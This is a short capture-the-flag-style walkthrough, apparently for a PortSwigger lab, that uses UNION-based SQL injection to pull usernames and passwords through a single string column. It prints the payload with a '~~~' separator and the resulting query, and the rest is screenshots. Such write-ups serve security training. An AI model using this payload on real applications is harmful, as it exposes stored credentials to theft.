## Lab Description:

<img width="868" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/d6c1c392-e4d0-448b-ab9f-7f55a7ad3b80">

## Solution:


Here, want to extract both usernames and passwords, while only having a single string column. For this, it can concatenate multiple values into single fields. The syntax depends on the database engine, so find out which database is used to drive the page.


<img width="1275" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/014d2c48-28fc-4c18-9a0e-201d87b8ca27">


<img width="1198" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/3b08c925-a18a-4346-99fa-6dea67cfe681">


To be able to distinguish username from password, I also need to concatenate some unique-ish string in between. I use an invalid category so that no articles are found and only my output appears.

I inject X' UNION (SELECT null,username || '~~~' || password FROM users)-- to create a SQL query like this:

```SELECT * FROM someTable WHERE category = 'X' UNION (SELECT null,username || '~~~' || password FROM users)--```


<img width="1280" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/ddecf2ce-eb55-442b-8999-00fb19023007">


<img width="1198" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/3273269a-17a3-4a75-a877-d948a3c51784">


<img width="1198" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/0bd110a5-aea5-42d8-9507-3f1579d5e2ea">


<img width="1193" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/23ae6f82-ae08-4620-bef7-1122b2dcb2a2">






